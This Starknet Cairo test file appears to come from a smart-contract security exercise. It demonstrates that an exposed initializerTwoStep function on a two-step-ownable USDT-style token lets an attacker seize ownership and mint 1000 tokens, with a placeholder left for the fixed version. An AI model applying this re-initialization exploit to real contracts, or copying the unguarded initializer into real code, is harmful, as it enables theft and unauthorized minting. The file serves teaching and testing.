use starknet::{ContractAddress};
use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait,  
    start_cheat_caller_address, stop_cheat_caller_address
};
use openzeppelin::token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
use access_control::two_step_transfer::ownable_2step::{
    IOwnableTwoStepDispatcher, IOwnableTwoStepDispatcherTrait, 
    IOwnableTwoStepCamelOnlyDispatcher, IOwnableTwoStepCamelOnlyDispatcherTrait
};

use access_control::two_step_transfer::usdt_v2::{
    IERC20MintingAndBurningDispatcher, IERC20MintingAndBurningDispatcherTrait
};

const USDT_DECIMALS: u256 = 1000000; // 6 Decimals

fn deploy_usdt() -> (ContractAddress, IERC20Dispatcher, IERC20MintingAndBurningDispatcher, IOwnableTwoStepDispatcher) {
    let contract_class = declare("USDTTokenV2").unwrap().contract_class();
    let mut data_to_constructor = Default::default();
    let deployer: ContractAddress = 123.try_into().unwrap();
    Serde::serialize(@deployer, ref data_to_constructor);
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();

    return (
        address,
        IERC20Dispatcher { contract_address: address },
        IERC20MintingAndBurningDispatcher { contract_address: address },
        IOwnableTwoStepDispatcher { contract_address: address }
    );
}

#[test]
fn test_two_step_transfer() {

    // Accounts
    let attacker: ContractAddress = 1.try_into().unwrap();
    let owner: ContractAddress = 123.try_into().unwrap();
    let owner2: ContractAddress = 124.try_into().unwrap();
    // Deploying USDT Token
    let (
        usdt_address, usdt_dispatcher, 
        minting_dispatcher, ownable_dispatcher
    ) = deploy_usdt();

    // Transfering ownership to owner2
    start_cheat_caller_address(usdt_address, owner);
    ownable_dispatcher.transfer_ownership(owner2);
    stop_cheat_caller_address(usdt_address);

    // Accepting ownership form owner2
    start_cheat_caller_address(usdt_address, owner2);
    ownable_dispatcher.accept_ownership();
    stop_cheat_caller_address(usdt_address);

    // Check that the owner is now owner2
    assert(ownable_dispatcher.owner() == owner2, 'Wrong owner');

    // Attack Start //
    let ownableDispatcher = IOwnableTwoStepCamelOnlyDispatcher { contract_address: usdt_address };
    ownableDispatcher.initializerTwoStep(attacker);
    start_cheat_caller_address(usdt_address, attacker);
    minting_dispatcher.mint(attacker, 1000 * USDT_DECIMALS);
    stop_cheat_caller_address(usdt_address);
    
    // Attack End //

    // The attacker should have at least 1000 USDT
    assert(usdt_dispatcher.balance_of(attacker) >= 1000 * USDT_DECIMALS, 'Wrong balance');
}

// TODO: Implement usdt_v2 using the fixed component
// then test that attack doesn't work using #[should_panic]
//#[test]
//fn test_fixed_two_step_transfer() {}